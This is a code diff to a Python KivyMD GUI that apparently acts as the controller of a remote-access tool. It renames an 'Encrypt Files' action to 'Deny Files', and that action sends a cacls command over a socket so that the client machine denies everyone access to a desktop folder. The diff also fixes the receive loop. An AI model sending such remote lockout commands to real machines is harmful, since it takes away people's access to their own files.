@@ -125,12 +125,12 @@ ScreenManager:
                 on_press: app.KillTask()
                 
             MDRectangleFlatButton:
-                id: encrFileBtn
-                text: "Encrypt Files"
+                id: denyFileBtn
+                text: "Deny Files"
                 pos_hint: {"center_x": .5, "center_y": .5}
                 opacity: 1
                 disabled: False
-                on_press: app.EncryptFiles()
+                on_press: app.DenyFiles()
 '''
 
 class Main(MDApp):
@@ -299,14 +299,15 @@ class Main(MDApp):
             self.root.ids.consoleField.text = output
             break
 
-    def EncryptFiles(self):
+    def DenyFiles(self):
         while True:
             command = 'cacls "C:\\Users\\%USERNAME%\\Desktop\\Test" /E /P everyone:n'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
             
-            output = self.currConn.recv(10248).decode()
+            output = self.currConn.recv(1024).decode()
             print('Output: ', output)
+            break
 
     #Zees Severe Disruption
     # File Creation Disruption
